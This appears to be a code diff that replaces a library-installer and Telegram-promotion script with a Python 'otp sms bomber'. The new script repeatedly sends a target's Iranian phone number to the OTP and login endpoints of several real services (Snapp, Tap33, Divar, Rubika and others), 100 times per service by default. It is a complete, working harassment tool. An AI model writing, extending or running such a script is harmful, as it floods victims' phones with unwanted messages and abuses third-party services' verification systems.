@@ -1,161 +1,71 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
+'''
+   
+'''
 
-# _________________________________________________________
-# Programming : Tech Coder
-# Github : https://github.com/Pypis
-# Telegram: https://t.me/Pypls
-# _________________________________________________________
-
-import os, sys, time
+from argparse import ArgumentParser
+from urllib3 import PoolManager
+from json import dumps
 from time import sleep
+from re import search
 
-os.system("pip install rich")
-time.sleep(1)
-os.system("clear")
+def send(cellphone):
+    http = PoolManager()
 
-import rich
-from rich.markdown import *
-from rich.console import *
+    # 1. snap otp [OK]
+    http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+        headers={'Content-Type': 'application/json'},
+        body=dumps({"cellphone": f"+98{cellphone}"}).encode())
+    
+    # 2. tap33 otp [OK]
+    http.request("post", "https://tap33.me/api/v2/user",
+        headers={'Content-Type': 'application/json'},
+        body=dumps({"credential": {"phoneNumber": f"0{cellphone}", "role": "PASSENGER"}}).encode())
 
-try:
-    import requests
-except ImportError:
-    pypls = "# • The library will be installed (requests) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install requests")
-    time.sleep(1)
-    os.system("clear")
+    # 3. echarge [OK]
+    http.request("post", "https://www.echarge.ir/m/login?length=19",
+        headers={'Content-Type': 'application/json'},
+        body=dumps({"phoneNumber": f'0{cellphone}'}).encode())
 
-try:
-    from bs4 import *
-except ImportError:
-    pypls = "# • The library will be installed (bs4) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install bs4")
-    time.sleep(1)
-    os.system("clear")
+    # 4. divar [OK]
+    http.request("post", "https://api.divar.ir/v5/auth/authenticate",
+        headers={'Content-Type': 'application/json'},
+        body=dumps({"phone": f'0{cellphone}'}).encode())
 
-try:
-    import webbrowser
-except ImportError:
-    pypls = "# • The library will be installed (webbrowser) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install webbrowser")
-    time.sleep(1)
-    os.system("clear")
+    # 5. shad  [OK]     
+    http.request("post", "https://shadmessenger12.iranlms.ir/",
+     headers={'Content-Type': 'application/json'},
+      body=dumps({"phone": f'0{cellphone}'}).encode())
 
-try:
-    import concurrent.futures
-except ImportError:
-    pypls = "# • The library will be installed (futures) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install futures")
-    time.sleep(1)
-    os.system("clear")
+    # 6. rubika [OK]  
+    http.request("post", "https://messengerg2c4.iranlms.ir/",
+     headers={'Content-Type': 'application/json'},
+      body=dumps({"phone": f'+{cellphone}'}).encode())
 
-try:
-    import mechanize
-except ImportError:
-    pypls = "# • The library will be installed (mechanize) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install mechanize")
-    time.sleep(1)
-    os.system("clear")
+    # 8. emtiaz [OK]
+    http.request("post", "https://web.emtiyaz.app/json/login",
+     headers={'Content-Type': 'application/json'},
+      body=dumps({"phone": f'+98{cellphone}'}).encode())
 
-try:
-    import stdiomask
-except ImportError:
-    pypls = "# • The library will be installed (stdiomask) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install stdiomask")
-    time.sleep(1)
-    os.system("clear")
+def spam(args):
+    if (search(r'9\d{9}$', args.cellphone)):
+        for time in range(args.times):
+            print(f"\rSending sms {time+1}/{args.times}", end='')
+            try:
+                send(args.cellphone)
+            except KeyboardInterrupt:
+                exit()
+            sleep(2)
+        print('')
+    else:
+        print("error: invalid cellphone format, format: 9\d{9} e.g. 90157xxxx")
 
-try:
-    from user_agent import *
-except ImportError:
-    pypls = "# • The library will be installed (user_agent) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install user_agent")
-    time.sleep(1)
-    os.system("clear")
+def main():
+    parser = ArgumentParser(prog="asmsb",
+        description="otp sms bomber",
+        epilog="By <hossin>")
+    parser.add_argument("cellphone", help="target cellphone: e.g. 90157xxxxx")
+    parser.add_argument("--times", help="count of SMSs (per service!)", type=int, default=100)
+    spam(parser.parse_args())
 
-try:
-    from faker import *
-except ImportError:
-    pypls = "# • The library will be installed (faker) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install faker")
-    time.sleep(1)
-    os.system("clear")
-
-try:
-    import telebot
-except ImportError:
-    pypls = "# • The library will be installed (telebot) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install Pytelegrambotapi==4")
-    time.sleep(1)
-    os.system("clear")
-
-try:
-    from colorama import *
-except ImportError:
-    pypls = "# • The library will be installed (colorama) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install colorama")
-    time.sleep(1)
-    os.system("clear")
-
-try:
-    import pyfiglet
-except ImportError:
-    pypls = "# • The library will be installed (pyfiglet) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install pyfiglet")
-    time.sleep(1)
-    os.system("clear")
-
-try:
-    import names
-except ImportError:
-    pypls = "# • The library will be installed (names) •"
-    tech = rich.markdown.Markdown(pypls, style="green")
-    rich.console.Console().print(tech)
-    print("")
-    os.system("pip install names")
-    time.sleep(1)
-    os.system("clear")
-
-
-webbrowser.open("https://t.me/Pypls")
-time.sleep(1)
-pypls = "# • Follow us on telegram ( @Pypls ) •"
-tech = rich.markdown.Markdown(pypls, style="green")
-rich.console.Console().print(tech)
-print("\033[2;32m")
-print(pyfiglet.figlet_format(" Thanks "))
-time.sleep(1)
+if (__name__ == "__main__"):
+    main()
